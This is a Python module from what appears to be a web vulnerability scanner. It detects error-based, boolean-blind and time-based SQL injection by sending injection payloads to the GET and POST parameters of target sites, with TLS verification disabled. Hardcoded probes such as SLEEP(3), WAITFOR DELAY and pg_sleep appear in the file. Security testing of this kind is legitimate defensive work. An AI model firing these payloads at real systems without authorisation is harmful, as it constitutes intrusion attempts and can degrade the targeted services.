"""
sqli.py — Rebel Protocol AWVDS
SQL Injection: error-based, boolean-blind, time-based. Multi-DB.
"""
import asyncio, re, time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
import httpx
from utils.payloads import SQLI_PAYLOADS, SQLI_ERROR_PATTERNS, randomize_payload
from utils.logger import info, critical

TIME_THRESHOLD = 2.5
TIME_PAYLOADS = ["1' AND SLEEP(3)--","1 AND SLEEP(3)--","') OR SLEEP(3)--","'; WAITFOR DELAY '0:0:3'--","1; SELECT pg_sleep(3)--"]
_CE = {db:[re.compile(p,re.IGNORECASE) for p in pats] for db,pats in SQLI_ERROR_PATTERNS.items()}

def _inj(url,param,val):
    parsed=urlparse(url); params=parse_qs(parsed.query,keep_blank_values=True)
    params[param]=[val]; return urlunparse(parsed._replace(query=urlencode(params,doseq=True)))

def _err(body):
    for db,pats in _CE.items():
        for p in pats:
            if p.search(body): return True,db,90
    return False,"",0

def _diff(a,b):
    if not a: return False
    return abs(len(b)-len(a))/max(len(a),1)>0.05

async def _get(client,url,param,hdrs,cook,tout):
    findings=[]
    try: base=(await client.get(url,headers=hdrs,cookies=cook,follow_redirects=True,timeout=tout)).text
    except: return findings
    for raw in SQLI_PAYLOADS[:20]:
        pl=randomize_payload(raw)
        try: body=(await client.get(_inj(url,param,pl),headers=hdrs,cookies=cook,follow_redirects=True,timeout=tout)).text
        except: continue
        found,db,conf=_err(body)
        if found:
            findings.append({"type":"SQL Injection (Error-Based)","url":_inj(url,param,pl),"parameter":param,"payload":pl,"severity":"CRITICAL","confidence":conf,"evidence":f"DB error ({db})","method":"GET","cwe":"CWE-89","recommendation":"Use parameterized queries."})
            return findings
        if _diff(base,body):
            try: fb=(await client.get(_inj(url,param,f"{raw}' AND '1'='2"),headers=hdrs,cookies=cook,follow_redirects=True,timeout=tout)).text
            except: fb=""
            if _diff(base,body) and _diff(body,fb):
                findings.append({"type":"SQL Injection (Boolean-Based Blind)","url":_inj(url,param,pl),"parameter":param,"payload":pl,"severity":"HIGH","confidence":60,"evidence":f"Lengths: base={len(base)} mut={len(body)} false={len(fb)}","method":"GET","cwe":"CWE-89","recommendation":"Use parameterized queries."})
                return findings
    for raw in TIME_PAYLOADS:
        try:
            t0=time.monotonic()
            await client.get(_inj(url,param,raw),headers=hdrs,cookies=cook,follow_redirects=True,timeout=tout+5)
            el=time.monotonic()-t0
        except: continue
        if el>=TIME_THRESHOLD:
            findings.append({"type":"SQL Injection (Time-Based Blind)","url":_inj(url,param,raw),"parameter":param,"payload":raw,"severity":"HIGH","confidence":75,"evidence":f"Delayed {el:.2f}s","method":"GET","cwe":"CWE-89","recommendation":"Use parameterized queries."})
            return findings
    return findings

async def _post(client,url,fd,param,hdrs,cook,tout):
    findings=[]
    try: base=(await client.post(url,data=fd,headers=hdrs,cookies=cook,follow_redirects=True,timeout=tout)).text
    except: return findings
    for raw in SQLI_PAYLOADS[:20]:
        pl=randomize_payload(raw)
        try: body=(await client.post(url,data={**fd,param:pl},headers=hdrs,cookies=cook,follow_redirects=True,timeout=tout)).text
        except: continue
        found,db,conf=_err(body)
        if found:
            findings.append({"type":"SQL Injection (Error-Based)","url":url,"parameter":param,"payload":pl,"severity":"CRITICAL","confidence":conf,"evidence":f"DB error ({db})","method":"POST","cwe":"CWE-89","recommendation":"Use parameterized queries."})
            return findings
    return findings

async def scan_sqli(endpoints,headers=None,cookies=None,timeout=10.0,concurrency=8):
    headers=headers or {}; cookies=cookies or {}; findings=[]; seen=set()
    sem=asyncio.Semaphore(concurrency)
    async def bnd(c): 
        async with sem: return await c
    async with httpx.AsyncClient(verify=False,follow_redirects=True) as client:
        tasks=[]
        for ep in endpoints:
            url=ep["url"]; m=ep.get("method","GET").upper(); params=ep.get("params",{})
            if not params: continue
            if m=="GET":
                for p in params: tasks.append(bnd(_get(client,url,p,headers,cookies,timeout)))
            elif m=="POST":
                fd={k:(v[0] if isinstance(v,list) else v) for k,v in params.items()}
                for p in fd: tasks.append(bnd(_post(client,url,fd,p,headers,cookies,timeout)))
        results=await asyncio.gather(*tasks,return_exceptions=True)
    for r in results:
        if isinstance(r,list):
            for f in r:
                key=f"{f['url']}|{f['parameter']}|{f['type']}"
                if key not in seen: seen.add(key); findings.append(f); critical(f"SQLi → {f['url']} [{f['parameter']}]")
    info(f"SQLi done. {len(findings)} finding(s)."); return findings

def run_sqli_scan(endpoints,headers=None,cookies=None,timeout=10.0):
    return asyncio.run(scan_sqli(endpoints,headers,cookies,timeout))
